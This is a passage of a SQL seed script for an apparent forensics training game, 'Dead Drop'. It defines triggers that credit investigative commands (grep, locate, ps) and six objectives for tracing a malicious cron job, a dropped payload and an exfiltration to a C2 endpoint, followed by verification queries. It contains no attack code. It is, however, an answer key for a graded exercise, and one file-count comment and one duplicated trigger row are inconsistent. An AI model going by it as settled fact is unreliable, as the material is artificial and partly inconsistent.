-- grep <anything> /var/log/net.log
((SELECT discovery_id FROM d WHERE discovery_key = 'EXFIL_CONFIRMED_VIA_NETLOG'),
 'grep', '/var/log/net.log', 'exact', NULL),

-- locate net.log
((SELECT discovery_id FROM d WHERE discovery_key = 'EXFIL_CONFIRMED_VIA_NETLOG'),
 'locate', 'net.log', 'contains', NULL),


-- ══════════════════════════════════════════════════════════════════════════════
-- DISCOVERY: PROCESS_ACTIVITY_EXAMINED  (bonus)
-- Triggered by any ps invocation — the process table shows a /tmp shell
-- ══════════════════════════════════════════════════════════════════════════════

-- ps  (basic process list)
((SELECT discovery_id FROM d WHERE discovery_key = 'PROCESS_ACTIVITY_EXAMINED'),
 'ps', NULL, 'exact', NULL),

-- ps aux  (full detailed process list — matches command-only trigger)
((SELECT discovery_id FROM d WHERE discovery_key = 'PROCESS_ACTIVITY_EXAMINED'),
 'ps', NULL, 'exact', NULL);


-- =============================================================================
-- SECTION 6: OBJECTIVES
-- =============================================================================
-- Objectives are triggered when their mapped step_order is credited
-- (directly or via discovery). This keeps the objective system intact.
-- =============================================================================

WITH s AS (
    SELECT scenario_id FROM scenarios
    WHERE title = 'Dead Drop'
    ORDER BY created_at DESC LIMIT 1
)

INSERT INTO objectives (scenario_id, title, description, is_secret, trigger_step, xp_reward, objective_order)
VALUES

(
    (SELECT scenario_id FROM s),
    'LOCATE_CRON_ENTRY',
    'Inspect the scheduled task configuration and identify all active jobs on this host.',
    FALSE, 1, 0, 1
),
(
    (SELECT scenario_id FROM s),
    'READ_MALICIOUS_CRON',
    'Open and read the suspicious cron entry — extract the scheduled script path and execution time.',
    FALSE, 2, 0, 2
),
(
    (SELECT scenario_id FROM s),
    'TRACE_EXECUTION_IN_SYSLOG',
    'Confirm the script execution event in the system log and identify associated network activity.',
    FALSE, 3, 0, 3
),
(
    (SELECT scenario_id FROM s),
    'DISCOVER_DROPPED_PAYLOAD',
    'Locate the hidden files or directories in /tmp left behind by the execution.',
    FALSE, 4, 0, 4
),
(
    (SELECT scenario_id FROM s),
    'ANALYZE_SCRIPT_CONTENTS',
    'Read or extract the malicious script content — identify collection targets, the C2 endpoint, and exfiltration method.',
    FALSE, 5, 0, 5
),
(
    (SELECT scenario_id FROM s),
    'CONFIRM_EXFIL_CONNECTION',
    'Cross-reference the network log to verify the C2 endpoint, TLS session details, and bytes transferred. [CLASSIFIED]',
    TRUE, 6, 150, 6
);


-- =============================================================================
-- VERIFICATION QUERIES
-- =============================================================================

-- Scenario inserted
SELECT scenario_id, title, type, difficulty, is_active, scenario_order
FROM scenarios
WHERE title = 'Dead Drop';

-- All virtual files (11 total: 6 dirs + 5 regular + 2 hidden payload + 1 history)
SELECT virtual_file_id, file_name, file_path, file_type, is_hidden,
       reveal_at_step, reveal_at_discovery_key, evidence_tags
FROM virtual_files
WHERE scenario_id = (
    SELECT scenario_id FROM scenarios WHERE title = 'Dead Drop' ORDER BY created_at DESC LIMIT 1
)
ORDER BY file_path;

-- 6 expected steps, weights sum to 100
SELECT step_order, command_expected, target_path, weight_percent
FROM expected_steps
WHERE scenario_id = (
    SELECT scenario_id FROM scenarios WHERE title = 'Dead Drop' ORDER BY created_at DESC LIMIT 1
)
ORDER BY step_order;

SELECT SUM(weight_percent) AS total_step_weight
FROM expected_steps
WHERE scenario_id = (
    SELECT scenario_id FROM scenarios WHERE title = 'Dead Drop' ORDER BY created_at DESC LIMIT 1
);

-- 7 discoveries (5 critical weight sum = 100)
SELECT discovery_key, weight_percent, is_critical, maps_to_step_order, discovery_order
FROM scenario_discoveries
WHERE scenario_id = (
    SELECT scenario_id FROM scenarios WHERE title = 'Dead Drop' ORDER BY created_at DESC LIMIT 1
)
ORDER BY discovery_order;

SELECT SUM(weight_percent) AS total_critical_discovery_weight
FROM scenario_discoveries
WHERE scenario_id = (
    SELECT scenario_id FROM scenarios WHERE title = 'Dead Drop' ORDER BY created_at DESC LIMIT 1
)
AND is_critical = TRUE;

-- Trigger count per discovery
SELECT disc.discovery_key, COUNT(dt.trigger_id) AS trigger_count
FROM scenario_discoveries disc
LEFT JOIN discovery_triggers dt ON dt.discovery_id = disc.discovery_id
WHERE disc.scenario_id = (
    SELECT scenario_id FROM scenarios WHERE title = 'Dead Drop' ORDER BY created_at DESC LIMIT 1
)
GROUP BY disc.discovery_key, disc.discovery_order
ORDER BY disc.discovery_order;

-- 6 objectives (5 visible, 1 secret)
SELECT objective_id, title, is_secret, trigger_step, xp_reward, objective_order
FROM objectives
WHERE scenario_id = (
    SELECT scenario_id FROM scenarios WHERE title = 'Dead Drop' ORDER BY created_at DESC LIMIT 1
)
ORDER BY objective_order;
